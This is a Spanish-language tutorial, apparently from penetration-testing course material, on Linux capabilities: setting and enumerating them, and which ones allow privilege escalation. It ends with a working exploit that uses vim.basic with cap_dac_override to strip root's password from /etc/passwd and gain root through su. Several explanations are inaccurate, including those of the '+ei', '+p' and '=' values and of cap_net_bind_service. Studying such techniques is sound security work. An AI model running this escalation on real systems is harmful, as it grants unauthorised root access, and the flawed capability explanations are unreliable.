Linux capabilities son una característica de seguridad en el sistema operativo Linux que permite otorgar privilegios específicos a procesos, permitiéndoles realizar acciones específicas que de otro modo estarían restringidas. Esto permite un control más granular sobre qué procesos tienen acceso a ciertos privilegios, haciéndolo más seguro que el modelo tradicional de Unix de otorgar privilegios a usuarios y grupos.

Sin embargo, como cualquier característica de seguridad, las Linux capabilities no son invulnerables y pueden ser explotadas por atacantes. Una vulnerabilidad común es el uso de capabilities para otorgar privilegios a procesos que no están adecuadamente aislados (sandboxed) de otros procesos, permitiendo así escalar sus privilegios y obtener acceso a información sensible o realizar acciones no autorizadas.

Otra potencial vulnerabilidad es el mal uso o uso excesivo de capabilities, lo cual puede resultar en procesos con más privilegios de los necesarios. Esto puede crear riesgos de seguridad innecesarios, ya que se podrían explotar estos privilegios para obtener acceso a información sensible o realizar acciones no autorizadas.

En general, las Linux capabilities pueden ser una característica de seguridad práctica, pero deben usarse con cuidado y correctamente para evitar vulnerabilidades y posibles exploits.

Configurar capabilities implica usar las herramientas y comandos apropiados para asignar capabilities específicas a ejecutables o programas. En Ubuntu, por ejemplo, se puede usar el comando `setcap` para establecer capabilities para ejecutables específicos. Este comando permite especificar la capability que queremos establecer y el valor que queremos asignar.

Por ejemplo, podríamos usar el siguiente comando para establecer la capability `cap_net_bind_service` para un ejecutable:

### Set Capability

```r
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Cuando se establecen capabilities para un binario, esto significa que el binario podrá realizar acciones específicas que no podría realizar sin las capabilities. Por ejemplo, si se establece la capability `cap_net_bind_service` para un binario, el binario podrá enlazarse a puertos de red, lo cual es un privilegio usualmente restringido.

Algunas capabilities, como `cap_sys_admin`, que permite a un ejecutable realizar acciones con privilegios administrativos, pueden ser peligrosas si no se usan correctamente. Por ejemplo, se podrían explotar para escalar privilegios, obtener acceso a información sensible o realizar acciones no autorizadas. Por lo tanto, es crucial establecer este tipo de capabilities para ejecutables adecuadamente aislados (sandboxed) y evitar otorgarlas innecesariamente.

|**Capability**|**Description**|
|---|---|
|`cap_sys_admin`|Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar configuraciones del sistema.|
|`cap_sys_chroot`|Permite cambiar el directorio raíz para el proceso actual, permitiéndole acceder a archivos y directorios que de otro modo serían inaccesibles.|
|`cap_sys_ptrace`|Permite adjuntarse y depurar otros procesos, potencialmente permitiendo obtener acceso a información sensible o modificar el comportamiento de otros procesos.|
|`cap_sys_nice`|Permite aumentar o disminuir la prioridad de los procesos, potencialmente permitiendo obtener acceso a recursos que de otro modo estarían restringidos.|
|`cap_sys_time`|Permite modificar el reloj del sistema, potencialmente permitiendo manipular marcas de tiempo o hacer que otros procesos se comporten de manera inesperada.|
|`cap_sys_resource`|Permite modificar los límites de recursos del sistema, como el número máximo de descriptores de archivo abiertos o la cantidad máxima de memoria que se puede asignar.|
|`cap_sys_module`|Permite cargar y descargar módulos del kernel, potencialmente permitiendo modificar el comportamiento del sistema operativo o obtener acceso a información sensible.|
|`cap_net_bind_service`|Permite enlazarse a puertos de red, potencialmente permitiendo obtener acceso a información sensible o realizar acciones no autorizadas.|

Cuando un binario se ejecuta con capabilities, puede realizar las acciones que las capabilities permiten. Sin embargo, no podrá realizar ninguna acción no permitida por las capabilities. Esto permite un control más granular sobre los privilegios del binario y puede ayudar a prevenir vulnerabilidades de seguridad y acceso no autorizado a información sensible.

Cuando se usa el comando `setcap` para establecer capabilities para un ejecutable en Linux, es necesario especificar la capability que queremos establecer y el valor que queremos asignar. Los valores que usemos dependerán de la capability específica que estamos estableciendo y los privilegios que queremos otorgar al ejecutable.

Aquí hay algunos ejemplos de valores que podemos usar con el comando `setcap`, junto con una breve descripción de lo que hacen:

|**Capability Values**|**Description**|
|---|---|
|`=`|Este valor establece la capability especificada para el ejecutable, pero no otorga ningún privilegio. Esto puede ser útil si queremos limpiar una capability previamente establecida para el ejecutable.|
|`+ep`|Este valor otorga los privilegios efectivos y permitidos para la capability especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capability permite, pero no permite que realice ninguna acción no permitida por la capability.|
|`+ei`|Este valor otorga los privilegios suficientes e inherentes para la capability especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capability permite y que los procesos hijos creados por el ejecutable hereden la capability y realicen las mismas acciones.|
|`+p`|Este valor otorga los privilegios permitidos para la capability especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capability permite, pero no permite que realice ninguna acción no permitida por la capability. Esto puede ser útil si queremos otorgar la capability al ejecutable pero prevenir que herede la capability o permita que los procesos hijos la hereden.|

Varias Linux capabilities pueden ser usadas para escalar los privilegios de un usuario a `root`, incluyendo:

|**Capability**|**Desciption**|
|---|---|
|`cap_setuid`|Permite a un proceso establecer su ID de usuario efectivo, lo cual puede ser usado para obtener los privilegios de otro usuario, incluyendo el usuario `root`.|
|`cap_setgid`|Permite establecer su ID de grupo efectivo, lo cual puede ser usado para obtener los privilegios de otro grupo, incluyendo el grupo `root`.|
|`cap_sys_admin`|Esta capability proporciona una amplia gama de privilegios administrativos, incluyendo la capacidad de realizar muchas acciones reservadas para el usuario `root`, como modificar configuraciones del sistema y montar y desmontar sistemas de archivos.|
|`cap_dac_override`|Permite omitir las verificaciones de permisos de lectura, escritura y ejecución de archivos.|

---

## Enumerating Capabilities

Es importante notar que estas capabilities deben usarse con precaución y solo otorgarse a procesos confiables, ya que pueden ser mal utilizadas para obtener acceso no autorizado al sistema. Para enumerar todas las capabilities existentes para todos los ejecutables binarios existentes en un sistema Linux, podemos usar el siguiente comando:

### Enumerating Capabilities

```r
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Este one-liner usa el comando `find` para buscar todos los ejecutables binarios en los directorios donde típicamente se encuentran, y luego usa la bandera `-exec` para ejecutar el comando `getcap` en cada uno, mostrando las capabilities que han sido establecidas para ese binario. La salida de este comando mostrará una lista de todos los ejecutables binarios en el sistema, junto con las capabilities que han sido establecidas para cada uno.

---

## Exploitation

Si obtenemos acceso al sistema con una cuenta de bajo privilegio, luego descubrimos la capability `cap_dac_override`:

### Exploiting Capabilities

```r
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Por ejemplo, el binario `/usr/bin/vim.basic` se ejecuta sin privilegios especiales, como con `sudo`. Sin embargo, debido a que el binario tiene la capability `cap_dac_override` establecida, puede escalar los privilegios del usuario que lo ejecuta. Esto permitiría al penetration tester obtener la capability `cap_dac_override` y realizar tareas que requieren esta capability.

Vamos a ver el archivo `/etc/passwd` donde se especifica el usuario `root`:

```r
cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Podemos usar la capability `cap_dac_override` del binario `/usr/bin/vim` para modificar un archivo del sistema:

```r
/usr/bin/vim.basic /etc/passwd
```

También podemos hacer estos cambios en un modo no interactivo:

```r
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Ahora, podemos ver que la `x` en esa línea ha desaparecido, lo cual significa que podemos usar el comando `su` para iniciar sesión como root sin que se nos pida la contraseña.